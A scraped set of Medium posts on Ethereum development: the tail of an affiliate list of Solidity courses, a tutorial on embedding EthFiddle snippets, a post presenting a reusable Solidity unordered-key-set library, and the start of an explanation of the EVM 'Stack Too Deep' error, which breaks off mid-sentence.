Ethereum Game Development: Build A Game On The BlockchainWork With Solidity & Other Tools, To Build A Fun Game! Gaining Greater Proficiency In Ethereum Blockchain Development.In this Ethereum Game Development Course, we\u2019re going to help you alleviate all of those questions you have around building something practical, upon the Ethereum Blockchain.We\u2019re going to help you build a Tic-Tac-Toe Game upon the Ethereum Blockchain, so you can become a more proficient Ethereum Blockchain Developer. Following which, you\u2019ll have worked with the Ethereum Blockchain at a more advanced level.That\u2019s the pure and simple goal, but, that entails covering every element of the Ethereum Blockchain Development journey, which we\u2019re sure you\u2019re going to find fascinating.4. Learn Solidity: Programming Language for Smart ContractsBest Solidity Tutorial Available Online to Build Blockchain Based Decentralized Application DApps on Ethereum Network.Solidity is a programming language for writing smart contracts which run on Ethereum Virtual Machine on Blockchain. It is a contract-oriented, high-level language whose syntax is similar to that of JavaScript and it is designed to target the Ethereum Virtual Machine.In this course you will learn everything related to Solidity to build Smart Contracts based Blockchain application on Ethereum.What is Ethereum, Smart Contracts & Blockchain?What is Solidity & Ethereum Virtual Machine?How to install & Setup Solidity Development Environment?How to write first basic smart contracts?Data types, control structure, functions, inheritance, mathematical operations, etc.How to deploy & test smart contracts in Solidity?Building 2 ApplicationsVoting Ballot on BlockchainFundRaiser ApplicationThis course will enable you to build any kind of Blockchain application on Ethereum using Solidity which is most common language for writing Ethereum Blockchain.5. Ethereum Developer Masterclass: Build Real World ProjectsStep-By-Step: Real-World dApps On The Blockchain Using Latest Solidity, Web3js, Truffle, TestRPC and MetaMask.Ethereum Developer Masterclass: Build Real World Projects \u2014 is the most complete Ethereum Blockchain Development course online helping you to build complex, real world, ethereum based distributed applications using solidity successfully.This course is perfect for anyone who wants to start there journey with the Blockchain, Solidity, and Ethereum whilst building something large and meaningful. Those who have an interest in advanced coding, including proven workflows and techniques will thoroughly enjoy this course.1. In this course we\u2019ll be detailing every aspect of the Ethereum Blockchain Development Ecosystem with you at an advanced level, enabling you to go forth to build complex Decentralised Applications using Solidity.2. Within this course we\u2019ll be guiding you through the process to create and launch your own Initial Coin Offering upon Ethereum, you\u2019ll then understand how it works on a technical level.3. By taking and completing this course we\u2019ll guide you through the steps to help you successfully build your very own completely decentralized exchange, and deploy it to Rinkeby-Testnet.6. Become a Blockchain Developer with Ethereum and SolidityDevelop your first decentralized application from scratch on the Ethereum blockchain.This course is a complete introduction to decentralized application (Dapp) development on the Ethereum blockchain using the Solidity language and the Truffle build framework.No need to know anything about the blockchain, you should just have some basic software development experience. Whether you have already written some code for backend, web or mobile applications, it should be enough to become a blockchain developer thanks to this course.The blockchain is all the rage these days, and there is a lot of theoretical or anticipative talk around it, but this course will help you get your hands dirty with actual code in order to build your first decentralized application. This is the kind of skill that can get you an actual job as a blockchain developer, something that is in skyrocketing demand right now.Have you ever looked back on the nineties, thinking you would have loved to be a part of the web revolution. Well, stop dreaming: the blockchain is here and it promises to be even bigger than the web or even the mobile revolution.We briefly cover the philosophy of the blockchain, both as a crypto-currency system and as a development platformThen we will explain how blockchains work, what are their main components and how its ecosystem is structuredAfter that we quickly go over the main cryptographic tools you need to understandWe continue with a description of the perfect development environment, including tools that are used by most professional blockchain developersAnd the biggest part of the course is dedicated to guiding you through the iterative creation, development, testing and deployment of the ChainList decentralized applicationTools that you will come acrossEthereum of courseThe Metamask Chrome extensionThe Solidity smart contract languageThe Truffle build and test framework (Truffle 4)The Ganache Ethereum node emulatorGithub PagesAtom (text editor)The Rinkeby test network7. Ethereum : Decentralized Application Design & DevelopmentDevelop a full DAPP | ICO | Setup Private netwrk in next 2 weeks using Web3J, TruffleV4, MetaMask, Ganache, Solidity +++.To build Ethereum Decentralized applications you will need to learn a couple of skills. This course can help you learn all of those skills but there are some prerequisites for the course:Experience with either Javascript or Java. Course will NOT teach JavascriptBasic understanding of the Javascript/HTML DOM modelAccess to a PC or MAC with access to the Internet (Minimum 4GB needed 6 GB preferred)Comfortable with new software installation & hands on codingThis course takes the approach of \u201cLearn by doing\u201d. Students are encouraged to try out all aspects of the technologies on their own after each lecture. Almost all of the concepts discussed in the lectures are shown in action by way code samples etc. The demo code used in the lectures is available for download from GitHub so that students can change the code to try out new things.Front end of the Decentralized applications are typically created as single page or desktop applications using Javascript/HTML/CSS. Since there are multiple Javascript frameworks, it was decided to keep the lectures independent of any specific JS framework. Students are free to use any one or more JS frameworks of their choice.Multiple quizzes in each section will validate student\u2019s knowledge. Coding exercises will help them understand the concepts better & gain confidence.Course is divided into 10 sections:Section#1Introduces the Blockchain & Ethereum technologySection#2Drills deeper into the Ethereum Blockchain technologyConcepts, WalletHands-on: Install Wallet, Mining for Ethers, TransactionsSection#3Ethereum ClientHands-on: Install Geth, Try out the geth commands & optionsSection#4 Geth Javascript Management APIHands-on: Try out the various API i console and by writing scriptsSection#5Web3 APIHands-on: Develop Javascript/HTML front end for executing contracts on TestNetSection#6Getting ready for Smart Contract developmentLearn about the various tools & frameworks used for developing smart contractHands-on: Installation : Visual Studio, Truffle framework version 4.0, Ganache, Meta-MaskSection#7Solidity for smart contracts developmentLearn the concepts of Solidity languageHands-on: Code simple contracts in Solidity + write test cases for testingSection#8Solidity &Infrastructure patternsHands-on: Code smart contractsEnd to end application walkthroughHands-on: DIY Project & SolutionSection#9Covers the setting up of private networksTools for managing private networksSection#10All about Initial Coin Offering & ERC20 Standard for creating and launching a coinStudents will learn how to create a coin and manage it in common tools.8. Ethereum Blockchain Developer: Build Projects Using SolidityOne Of The Largest, Most In-Depth Ethereum Blockchain Development Courses, Helping You To Build Projects Using Solidity.Ethereum Blockchain Developer: Build Projects Using Solidity \u2014 is one of the largest, most in-depth ethereum development courses online. The curriculum contains a number of practical exercises, which will help you put all the knowledge you\u2019ve learned into practice to create something of value.By taking this course you\u2019ll get to work with the ethereum blockchain on a practical level, with step-by-step instructions guiding you through the entire process. This course embodies our ethos of learning by doing, as you\u2019ll have projects created of your very own by completing this course.1. We\u2019re in the early adopter stage with ethereum technology, so you currently have the chance to get in at the ground level and become proficient in it before it reaches the next adoption stage.2. Being apart of a community is crucial when it comes to new technology, and the ethereum communities are some of the most friendliest, hence you\u2019ll be able to communicate with them effectively having created projects of your very own in this course.3. There aren\u2019t many blockchain developers, yet there\u2019s huge demand! If you decide to continue to advance your journey in this field, you can be assured there are companies seeking your skills.9. Ethereum and Solidity: The Complete Developer\u2019s GuideUse Ethereum, Solidity, and Smart Contracts to build production-ready apps based on the blockchain.The development community is still figuring out the best way to use Ethereum in the creation of new and exciting apps. I spent a tremendous amount of time to research and create best practice for interfacing with Ethereum from Javascript. I can\u2019t overstate it enough; this course will show you the best and most easily repeatable patterns for creating production-ready apps with Ethereum.10. Create Ethereum & Blockchain Applications Using SolidityLearn about everything there is to know about Ethereum and Blockchain Based Applications and How To Program Them. A step by step process is used to show explain every facet of these topics.Gain a good understanding of the following concepts with this course:What Solidity Is?How To Create Blockchain Applications?What Blockchain is?How Blockchain works?What is Bitcoin?What is Ethereum?Programming Blockchain ProgramsWhat are Cryptocurrencies?How Cryptocurrencies work?Alternative cryptocurrenciesCryptography basics11. Blockchain SpecializationThis specialization introduces blockchain, a revolutionary technology that enables peer-to-peer transfer of digital assets without any intermediaries, and is predicted to be just as impactful as the Internet. More specifically, it prepares learners to program on the Ethereum blockchain. The four courses provide learners with (i) an understanding and working knowledge of foundational blockchain concepts, (ii) a skill set for designing and implementing smart contracts, (iii) methods for developing decentralized applications on the blockchain, and (iv) information about the ongoing specific industry-wide blockchain frameworks.The specialization covers a range of essential topics, from the cryptographic underpinnings of blockchain technology to enabling decentralized applications on a private Ethereum blockchain platform.It is ideal for programmers and designers involved in developing and implementing blockchain applications, and anyone who is interested in understanding its potential.In this course you will learn :Understand smart contracts, a core idea and computational model of blockchain that enables automation, autonomy, scalability and transparency.How to design and program smart contracts and decentralized application.Have an understanding and working knowledge of the emerging blockchain technology.How to think of innovative application models, leveraging the blockchain technology.Disclosure: We are affiliated with some of the resources mentioned in this article. We may get a small commission if you buy a course through links on this page. Thank you.", "responses": 0, "tags": ["Ethereum", "Cryptocurrency Investment", "Cryptocurrency", "Crypto", "Solidity"]}, {"title": "How to Embed Solidity Code Snippets in Your Website / Blog (Using EthFiddle)", "post_link": "https://medium.com/loom-network/how-to-embed-solidity-code-snippets-in-your-website-blog-using-ethfiddle-980f79649c15?source=search_post", "author_name": "Georgios Konstantopoulos", "author_link": "https://medium.com/@gakonst", "publish_date": "2018-01-04", "last_modified_date": "2019-08-19", "readtime": "2.05", "claps": 361, "voters": 43, "content": "How to Embed Solidity Code Snippets in Your Website / Blog (Using EthFiddle)Georgios KonstantopoulosFollowJan 4, 2018 \u00b7 3 min readUp until now, there hasn\u2019t been an easy way to embed your Ethereum Solidity code snippets into posts on your blog or website. Most blog posts I have seen have been using github gists with Javascript code highlighting.Last week, we added oEmbed functionality to EthFiddle. That means you can now easily add syntax-highlighted Solidity snippets in your blog posts that are nicely styled, while also providing a fast way to compile and test the Smart Contract in your browser.How?The straightforward wayWordpress / Medium / BloggerIf you are using a platform that supports oEmbed such as Medium or Wordpress, you do not have to do any complex work. Just paste your EthFiddle link and the platform will do the heavy lifting for you!The below fiddle renders by just pasting its link and pressing enter.https://ethfiddle.com/2Rx8cQdEx3Other PlatformsEthfiddle also works with embed.ly! Navigate to this link and input your ethfiddle URL. At the bottom of the page it returns a code snippet that you can use to embed your fiddle!<blockquote class=\u201dembedly-card\u201d><h4><a href=\u201dhttps://ethfiddle.com/2Rx8cQdEx3\">2Rx8cQdEx3</a></h4><p>1 Solidity code sharing site. Share Solidity code snippets with friends, or check out cool code snippets from around the web.</p></blockquote><script async src=\u201d//cdn.embedly.com/widgets/platform.js\u201d charset=\u201dUTF-8\"></script>Note: Embed.ly is a paid service and costs $9 / mo.The hard wayWhat do you do when you are building your own custom website and you don\u2019t want to use embed.ly?You can get an embed code from EthFiddle by crafting a special URL that looks like this and doing a GET request:$ curl https://ethfiddle.com/services/oembed?url=ethfiddle.com/2Rx8cQdEx3&format=jsonThe server responds with (formatted with http://jsonprettyprint.com/):{  \"type\": \"rich\",  \"version\": 1,  \"title\": \"2Rx8cQdEx3\",  \"provider_name\": \"Ethfiddle\",  \"provider_url\": \"https://ethfiddle.com\",  \"cache_age\": 86400,  \"html\": \"<iframe id=\"ef_2Rx8cQdEx3\" src=\"https://ethfiddle.com/services/iframesnippet/2Rx8cQdEx3\" scrolling=\"no\" frameborder=\"0\" height=\"300\" width=\"300\" allowtransparency=\"true\" class=\"ef_embed_iframe\" style=\"width: 100%; overflow: hidden;\"></iframe>\",  \"width\": \"300\",  \"height\": \"300\"}Note the html key. You can copy the iframe code and add it to your website. Of course you can modify the CSS in order to fit your style.In this example you would add the following to your site:<iframe src=\"https://ethfiddle.com/services/iframesnippet/2Rx8cQdEx3\" scrolling=\"no\" frameborder=\"0\" height=\"300\" width=\"300\" allowtransparency=\"true\" class=\"ef_embed_iframe\" style=\"width: 100%; overflow: hidden;\"></iframe>ConclusionAnd that\u2019s it! Now you can easily embed Solidity code snippets on all your sites and blog posts.If you\u2019re learning Solidity or building Ethereum DApps, you may be interested in our interactive Solidity code academy or our scalable sidechains for Ethereum DApps.Join our mailing list below to get regular updates:Loom Network is the blockchain platform of choice for serious dapp developers \u2014 the Universal Layer 2 that provides developers the tools they need to build functional user-facing dapps today.New to Loom? Start here.Want to stake your LOOM tokens and help secure Loom Network? Find out how.And if you enjoyed this article and want to stay in the loop, go ahead and sign up for our private mailing list.", "responses": 0, "tags": ["Web Development", "Ethereum", "Solidity", "Blockchain", "Programming"]}, {"title": "Solidity CRUD- Epilogue", "post_link": "https://medium.com/robhitchens/solidity-crud-epilogue-e563e794fde?source=search_post", "author_name": "Rob Hitchens", "author_link": "https://medium.com/@robhitchens", "publish_date": "2019-03-27", "last_modified_date": "2019-04-18", "readtime": "8.72", "claps": 241, "voters": 34, "content": "Solidity CRUD- EpilogueRob HitchensFollowMar 27 \u00b7 9 min readA Reusable Implementation of the popular storage pattern for Ethereum.Photo by Jason Leung on UnsplashI first wrote about Solidity CRUD in 2017. As expected, since that time I have found a lot of use-cases that call for something like Solidity CRUD to deal with dynamic sets in one way or another.By \u201cdynamic sets\u201d I refer to logical sets with members that come and go. Even though nothing is ever really deleted from Ethereum, there are plenty of cases where a contract needs a way to logically remove an item from a list.Many nasty coding challenges boil down to focusing on getting the data structure right. This, so the function implementations flow naturally. Through my training work at B9lab I\u2019ve found that getting a feel for storage structure is a challenge for even very experienced developers because this platform is very different from server-based storage.Certain themes emerge with repetition:Check existence.Ensure key uniqueness.Insert.Enumerate the members.Count.Remove.Solidity CRUD implements sets (tables, entities, collections if you prefer) with a three-part description:A struct with everything but the unique identifier. This struct contains a pointer to the unordered key index. The pointer is important for the delete process.An unordered key index with keys appended as instances (records, rows) are added. This is important for counting instances and enumerating the keys that exist in the set.A mapping that stores the structs so random access and existence checks are possible without iteration. (We don\u2019t like iteration. See Getting Loopy with Solidity.)With this data structure, all the concerns mentioned above are easily handled with one-step, a.k.a. \u201cO(1)\u201d, complexity. You get a storage layout that looks something like this:struct Object {  type name;  type name;  type name;  uint indexPointer;}mapping(bytes32 => Object) objects;bytes32[] objectList;Unordered Sets for Referential IntegrityI wrote about using such sets in a nested way to make a set of \u201cwhere used\u201d records in Enforcing Referential Integrity in Ethereum Smart Contracts,Suffice it to say that if a contract deals with multiple sets and they are related, things are going to get tedious. Here\u2019s the example I gave for a pair of tables with a one-to-many relationship.// first entity is called a \"One\"        struct OneStruct {        uint oneListPointer; // needed to delete a \"One\"        // One has many \"Many\"        bytes32[] manyKeys;         mapping(bytes32 => uint) manyKeyPointers;        // more app data    }        mapping(bytes32 => OneStruct) public oneStructs;    bytes32[] public oneList;        // other entity is called a \"Many\"        struct ManyStruct {        uint manyListPointer; // needed to delete a \"Many\"        bytes32 oneKey; // many has exactly one \"One\"        // add app fields    }        mapping(bytes32 => ManyStruct) public manyStructs;    bytes32[] public manyList;We want Ethereum contracts to be minimalist, clean, readable and importantly, we want to reduce cognitive overhead for both developers and reviewers \u2014 simple, well-solved contracts so the workings of the contract are apparent to as many people as possible. Admittedly, nesting the pattern like that starts to push against those ideals.The LibraryLately, I\u2019ve been thinking about how to keep it DRY, as in \u201cDon\u2019t Repeat Yourself.\u201d There is a repeating pattern here:a set of keys, the treatment of which is completely consistent, andan application-level set of variables that could be anything at all, and is of no consequence to the logic that deals with the keys.We can clean this up by separating those concerns and implementing the repetitive part in a general-purpose UnorderedKeySet library.Libraries don\u2019t have state. They get that from the contracts that call them. When we implement the Solidity CRUD pattern using a library, our methods will be assigned to variables in the contract. If you\u2019re unfamiliar with libraries in Solidity, have a look at the official documentation and the popular SafeMath library.We Can Create a Set Type That Will Do Most of the WorkWouldn\u2019t it be great to handle Solidity CRUD sets with a few concise methods? Even better, wouldn\u2019t it be great to know that we\u2019re working with a well-solved module that doesn\u2019t need customization?Long story, short, the HitchensUnorderedKeySet rolls up all the housekeeping and integrity concerns while ignoring the application-level variables.The library implements the Solidity CRUD pattern (I hacked out the error messages to make it little more Medium-friendly):import \"./Ownable.sol\";library HitchensUnorderedKeySetLib {        struct Set {        mapping(bytes32 => uint) keyPointers;        bytes32[] keyList;    }        function insert(Set storage self, bytes32 key) internal {        require(!exists(self, key));        self.keyPointers[key] = self.keyList.push(key)-1;    }        function remove(Set storage self, bytes32 key) internal {        require(exists(self, key)\");        bytes32 keyToMove = self.keyList[count(self)-1];        uint rowToReplace = self.keyPointers[key];        self.keyPointers[keyToMove] = rowToReplace;        self.keyList[rowToReplace] = keyToMove;        delete self.keyPointers[key];        self.keyList.length--;    }        function count(Set storage self) internal view returns(uint) {        return(self.keyList.length);    }        function exists(Set storage self, bytes32 key)         internal view         returns(bool)     {        if(self.keyList.length == 0) return false;        return self.keyList[self.keyPointers[key]] == key;    }        function keyAtIndex(Set storage self, uint index)         internal view         returns(bytes32)     {        return self.keyList[index];    }        function nukeSet(Set storage self) public {        delete self.keyList;    }}In the simple example, the contract is just maintaining a list of keys without any additional fields:contract HitchensUnorderedKeySet {        using HitchensUnorderedKeySet... for ... KeySetLib.Set;    HitchensUnorderedKeySetLib.Set set;        event LogUpdate(address sender, string action, bytes32 key);        function exists(bytes32 key) public view returns(bool) {        return set.exists(key);    }        function insert(bytes32 key) public {        set.insert(key);        emit LogUpdate(msg.sender, \"insert\", key);    }        function remove(bytes32 key) public {        set.remove(key);        emit LogUpdate(msg.sender, \"remove\", key);    }        function count() public view returns(uint) {        return set.count();    }        function keyAtIndex(uint index) public view returns(bytes32) {        return set.keyList[index];    }    }To my eye, that\u2019s a little easy to look at.Using the Library to Hold RecordsYou can lay out mapped structs to hold data and it will still be easy to look at:contract Widget {        using HitchensUnordered... for ...KeySetLib.Set;    HitchensUnorderedKeySetLib.Set widgetSet;        struct WidgetStruct {        string name;        bool delux;        uint price;    }        mapping(bytes32 => WidgetStruct) widgets;Functions are intuitive enough, and since the library is overseeing key insertions and removals, most of the \u201cchecks\u201d are done for you:function newWidget(  bytes32 key,   string memory name,   bool delux,   uint price)   public {  widgetSet.insert(key);  WidgetStruct storage w = widgets[key];  w.name = name;  w.delux = delux;  w.price = price;  emit LogNewWidget(msg.sender, key, name, delux, price);}The insert() method will fail if the key to insert already exists. As a \u201cpublic service announcement\u201d, if you\u2019re unfamiliar with storage pointers, read this.Simplified Expression of RelationshipsThe improved readability of this approach starts to shine in cases where there is a lot going on. Consider a contract with Red Teams and Blue Teams that form inside Games. Imagine each Player is a struct with properties like all-time achievement, privileges, etc. \u2014 properties that are important for contract logic.Such a thing would have more moving parts than the simple one-to-many example, so we would expect the long-hand form of the functions to get even more busy. That\u2019s not ideal. The library let\u2019s us say it more concisely, which is what we want because it means less opportunity for oversight to creep in.Consider the hypothetical structure of a Game:HitchensUnorderedKeySet.Set gameSet;struct GameStruct {  HitchensUnorderedKeySet.Set redTeam;  HitchensUnorderedKeySet.Set blueTeam;  // carry on about the game}mapping(bytes32 => GameStruct) games;We said a lot there.Games are known by unique identifiers and contain two sets of players for the two teams. We can give the players the same treatment and easily enforce a rule to ensure that players need to exist before joining a Game team (if we need to). Players can be on different teams for different games at the same time.Keeping in mind that state doesn\u2019t need to contain data unless it\u2019s logically important to a contract, we can consider that \u201cWhere Used\u201d is often important. For example\u2019s sake, let\u2019s say we want each player to encapsulate the games participated in.HitchensUnorderedKeySet.Set playerSet;struct PlayerStruct {  HitchensUnorderedKeySet.Set gameSet;  // carry on about the players}mapping(bytes32 => PlayerStruct) players;That was almost too easy. We now have a \u201cWhere Used\u201d list so we can know which players must not be deleted: Two-way bindings with concise code. Nice.By the way, since the library always uses bytes32keys (because bytes32 can hold the types we should want to use for a key) you can use helper functions to convert to/from address. The expressions are easily coded into pure functions in your contract:function addressToBytes32(address a) public pure returns(bytes32) {  return bytes32(uint(uint160(msg.sender)));}function bytes32ToAddress(bytes32 b) public pure returns(address) {  return address(uint160(uint(key)));}Consider using a hash function for bytes and strings if you really need to use those for keys.Inserting Into Related RecordsLet\u2019s carry on. If we want to push a player into a team in a game and we wish to maintain the above-mentioned bi-directional pointers, it would look something like:function joinGame(bytes32 gameId, bool team)...{  require(playerSet.exists(msg.sender), \"Register please\");  require(gameSet.exists(gameId), \"Not a game\");  GameStruct storage g;  PlayerStruct storage p;  if(team) g.redTeam.insert(msg.sender);  if(!team) g.blueTeam.insert(msg.sender);  p.insert(gameId);  emit ...}Did you notice the bi-directional binding? We\u2019re populating both the game players and the player games. We also addressed an implied requirement. A player can\u2019t join a game twice, not even on opposite teams because the last insert() would fail the uniqueness test. Pick a team, Alice!We can easily check all sorts of things that might be important at an application level.Are you on the red team?require(g.redTeam.exists(msg.sender), \"You're not on the red team\");How many players are on the blue team?return g.blueTeam.count(); // how many players are there?Who is on the blue team?return g.blueTeam.keyAtIndex(row); // where row is a uint < count()The higher level of abstraction means more thinking about what the application should do and less anxiety about what the contract actually does.DeleteWe can also decide what we want to do about deletes. We have some flexibility here.In the case that a player wants to quit a team, we have to dismantle whatever relationships we assembled in the insertion process. Remove the player from the game and remove the game from the player.Maybe something like:function quitTeam(bytes32 gameId, bool team) public {  GameStruct storage g = games[gameId];  PlayerStruct storage p = players[msg.sender];  if(team) g.redTeam.remove(msg.sender);  if(!team) g.blueTeam.remove(msg.sender);  p.remove(gameId);  emit ...}Again, the library will revert transactions in case the input is nonsense, because it doesn\u2019t remove() keys that don\u2019t exist. This catches non-existent games and players who aren\u2019t on the teams, without any help from us.Cascade DeleteOr, we can do a cascade delete and obliterate heavy structures.As always, it would be a bad idea to delete a master record when other records depend on it. You would want to prevent that with something like:require(relatedSet.count() == 0, \u201cSomething depends on this.\");But, if a big structure was built up \u2026HitchensUnorderedKeySet.Set myBigThingSet;struct MyBigThing {  HitchensUnorderedKeySet.Set aBigSet;  HitchensUnorderedKeySet.Set anotherBigSet;  HitchensUnorderedKeySet.Set yetAnotherBigSet;  HitchensUnorderedKeySet.Set whereUsedElsewhere;}mapping(bytes32 => MyBigThing) myBigThings;\u2026 and you want it gone:myBigThing storage t = myBigThings[key];require(t.whereUsedElsewhere.count() == 0, \"Relational Integrity.\");myBigThingSet.remove(key);delete myBigStructs[key];The remove() function ensures the key exists so we don\u2019t have to. The first three sets could contain considerable information, and this deletes it all in one move. Although there is gas refund for removing non-zero value from storage, delete will not recurse to fully realize the potential. Have a look here for an interesting detail about garbage collection (or the lack thereof):Is it possible to access the mapping of a deleted structThanks for contributing an answer to Ethereum Stack Exchange! Please be sure to answer the question. Provide details\u2026ethereum.stackexchange.comThe existence of uncollected garbage doesn\u2019t effect the nature of the logical delete, so it can be generally ignored. There may be an opportunity to be a good citizen and clean up more effectively and earn gas refunds by releasing storage.Reset All Values in MappingLogical sets are useful for addressing difficult problems. For example, have a look at this question about resetting all of the values in a mapping. There is no efficient way to do that as worded, but logical sets can produce the desired effect with ease:Reset all values in a mappingFor resetting the balance stored in mapping, you have to record the mapping entries, because you cannot use .length\u2026ethereum.stackexchange.comOverwrites are Out Of ScopeOverwrites to your own mapped structs are out of scope for three reasons:They are not about key lists, by definition.The library would need knowledge about the layout to present an appropriate function interface and that will be different for every application.It\u2019s trivial to add an existence check at the application level, as shown in the updateWidget() function in the example. Remember to check exists(key). It may help to notice that if you miss that step, then your update function won\u2019t consult the library at all. That should feel wrong.Stay tuned for another library that will further generalize storage, including updates and application-level fields. Not the last storage solution you will ever need, but a step in that direction.Complete ExamplesThe code repo contains two examples. The library itself contains a minimal contract so you can load it Remix and experiment with the raw library functions. There is also a Widget Example to show a more fleshed out implementation.Enjoy!Rob Hitchens is a Canadian smart contract design consultant, co-founder of Ethereum smart contract auditor Solidified.io and a courseware co-author and mentor of Ethereum, Hyperledger Fabric, Hyperledger Sawtooth Lake, Corda, Quorum and Tezos bootcamps by B9lab.", "responses": 2, "tags": ["Ethereum", "Solidity", "Solidity Tutorial", "Programming", "Smart Contracts"]}, {"title": "\u201cStack Too Deep\u201d- Error in Solidity", "post_link": "https://medium.com/coinmonks/stack-too-deep-error-in-solidity-608d1bd6a1ea?source=search_post", "author_name": "Aventus Network", "author_link": "https://medium.com/@aventus", "publish_date": "2019-01-07", "last_modified_date": "2019-01-07", "readtime": "15.1", "claps": 413, "voters": 37, "content": "\u201cStack Too Deep\u201d- Error in SolidityAventus NetworkFollowJan 7 \u00b7 16 min readHappy New Year and may we all have great accomplishments in 2019! Aventus is welcoming you back from the winter holidays with a post related to errors in Solidity, by our very own, Alex Pinto.When one starts coding smart contracts in Solidity, sooner or later, s/he will hit a very annoying obstacle. The \u201cStack Too Deep\u201d error. It is easy to fall into this trap, and when that happens, it is often hard to find a way out. To be fair, the underlying reason is not in Solidity itself, but in the Ethereum Virtual Machine (the EVM), and so will likely affect other languages that compile into EVM (ie LLL, Serpent, Viper), but that is a subtle distinction in the day-to-day job of coding smart contracts.Surprisingly, given the level of annoyance this can cause, it is very hard to find good resources on how to deal with it, so I decided to write this post to try to shine some light on it, for my own benefit and for anyone else who may be despairing with it.In general terms, this error seems to be generated when the code needs to access a slot in the stack that is deeper than its 16th element (counting from the top downwards). How we get there, though, can be done in more than one way. This post does not aim to offer a full theory of how this error is generated: from my experience, there are too many ways to do it. But it will give a good rationale for a common trigger, and will hopefully make the reader more aware of how the EVM manages its stack. It may even be possible to extend the same logic to other situation where the error occurs, and look for ways to avoid it.In Solidity, most types (ie elementary types, like numbers, addresses and booleans for example, but not arrays, structs nor mappings) are passed by value to a function: when the function is called, a part of the stack (ie a stack frame) is allocated to hold the return position the program should go to when the function returns (the \u2018return address\u2019) and a copy of the function value-type input and output arguments. Each argument will normally hold a slot in the stack, where each slot is 256 bits.This provides the most basic way of hitting a \u201cStack Too Deep\u201d error: have a total of more than 16 input and output arguments. But in reality, if we want that function to do something useful, we will have to be very careful and probably have to reduce the number of arguments.To test this, I created a small contract in Remix like this:pragma solidity ^0.4.24;contract TestStackError {  event LogValue(uint);  function logArg(uint a1) public {    emit LogValue(a1);  }}Remix is great for an investigation like this because we can quickly write a contract and query it, but fundamentally because Remix gives a powerful debugger with opcode disassembly and a full listing of the stack, memory and storage. It\u2019s also easy to move back and forward through the code, giving one of the best debugging experiences I\u2019ve had in any language.This contract is very simple: it has no state variables and only one function, which also is extremely uncomplicated. This function takes only one argument and logs it.I copy this contract to a new file in Remix, compile it and deploy it. There should be no errors and warnings, and so I go to the Run tab, and hit Deploy.Then, I extend the list for the SimpleFunction contract, and enter a single value in the box in front of logArg. I press the button and check the output in the console:As you can see, I entered the value 7, and that was returned as the only element in the logs. Although logs are worth another post, there are a few things I should mention here.This is the JSON-formatted logs object of this call:logs [{  \"from\": \"0xef55bfac4228981e850936aaf042951f7b146e41\",  \"topic\": \"0xfcf771399d75a67a6d0e730ae98d34c40b6bfe6ebf8053b98ddf4da8c2706250\",  \"event\": \"LogValue\",  \"args\": {    \"0\": \"7\",    \"length\": 1  }}Logs are created by the emit keyword in solidity, which raise a solidity event and correspond to LOGn opcodes.Logs can be filtered by client-side applications running off-chain. A filter is a condition on any of the topics available in the log.A log always has a topic 0, which is an encoding of the event\u2019s signature.Further topics can be created by making an argument indexed. There can be up to 3 indexed arguments. The remaining ones are considered event dataIn this simple example, we can easily identify that there is only one topic (\"0xfcf771399d75a67a6d0e730ae98d34c40b6bfe6ebf8053b98ddf4da8c2706250\") and that the data are displayed as part of the args member of the log object. We can also verify the code is working as expected.Let\u2019s now test the limits of this contract and change the function to accept the maximum number of arguments.pragma solidity ^0.4.24;contract TestStackError {  event LogValue(uint);  function logArg(uint a1, uint a2, uint a3, uint a4,\tuint a5, uint a6, uint a7, uint a8,\tuint a9, uint a10, uint a11, uint a12,\tuint a13, uint a14, uint a15, uint a16  ) public {    emit LogValue(a16);  }}I have 16 input variables, no output variables, therefore I only need to use 16 stack slots. I invoke the function passing the values 1 to 16 and emit the last value. I check the logs and see the value 16. Brilliant, this works!Then, I make a very small change to my contract: I log the first argument instead:Wait, what?! Simply logging a different argument has turned a perfectly fine contract into a \u201cStack Too Deep\u201d error. Wow, what\u2019s going on in here?This is not something Solidity can elucidate. At that level, the change looks perfectly harmless. I need to go down into the EVM bytecode to understand what is going on. But before I do that, I want to make another test, to gather some clues. I create a third version of this contract, but logging a2 instead:pragma solidity ^0.4.24;contract TestStackError {  event LogValue(uint);  function logArg(uint a1, uint a2, uint a3, uint a4,\tuint a5, uint a6, uint a7, uint a8,\tuint a9, uint a10, uint a11, uint a12,\tuint a13, uint a14, uint a15, uint a16  ) public {    emit LogValue(a2);  }}This works, and logs the correct value. The same happens when I log a3. I hypothesise then that all the arguments between a2 and a16 can correctly be logged.The resulting opcodes are in these three files:log(a2)log(a3)log(a16)I compared all the 3 logs between themselves, and the very first thing that struck me was that they all differed in size (number of lines). The second thing is that they are remarkably equal until line 237, with only one exception. The code after this line is very different and apparently unpredictable. However, since that seems to come after the function has returned, I will simply ignore it.Then I focused on the one difference between line 237, occurring at line 198. I was happy to confirm an idea that I had thought could explain the stack too deep error \u2014 that in some place of the code we would logically need to call some non-existing DUP or SWAP opcode. That indeed seems to be the case here: all 3 versions are the same until line 237, except for one single difference on line 198:log(a2): DUP16log(a3): DUP15log(a16): DUP2The opcodes DUPn duplicate the value at the nth level of the stack. There are only 16 such opcodes, from DUP1 to DUP16. DUP1 pushes to the stack a copy of the value currently at the top, and DUP16 copies the 16th highest value in the stack. There is an evident relationship between the place of the variable in the argument list and the value of DUPn in this line, and if I extrapolate it to the case log(a1), this rule implies we will need an opcode DUP17. But such an opcode does not exist, it points to a value lower in the stack than we can reach, which justifies the error message \u201cStack Too Deep\u201d.Satisfied with this, my natural curiosity asks the question: what role is this DUP opcode performing here? What is its purpose?Bytecode is intimidating. The last time I looked at assembly code with some level of intention of understanding it was in my teens, playing with the Spectrum\u2019s Z80 processor. I have not any experience of doing it with the EVM, so I don\u2019t plan to parse 200 lines of an assembly-like listing in my head. But Remix does offer quite good tools in this respect. In the debug tab, we can replay the transaction opcode by opcode, and at a glance see the contents of the stack, the memory and the storage, among others.Before I proceed, I\u2019d like to point you towards this series of posts in the Zeppelin blog by Alejandro Santander on the structure of assembly EVM code. It is a priceless introduction to EVM assembly, and will save me from having to explain the boilerplate. Another extremely useful link is this list of EVM opcodes, that is my favourite reference to find the functionality of each opcode. I highly recommend it.There is not much to this function, and most of the bytecode is repetitive. There are 17 occurrences of the opcode CALLDATALOAD. The first one appears in the first block of the code, before the function dispatch. It checks whether the calldata is too short (line 12), in which case the function would revert. After this, it compares the function selector to those of the methods known to the contract (in this case, only one: e898288f) and if it matches any, directs the flow to the address that implements that function. Otherwise, the call reverts.In this case, the code has called the only existing function and so the flow jumps to address 70 (line 25) to process it.The remaining 16 instances of CALLDATALOAD are exactly the number or arguments we have, they appear at exactly 9 lines intervals, and are probably responsible for processing each 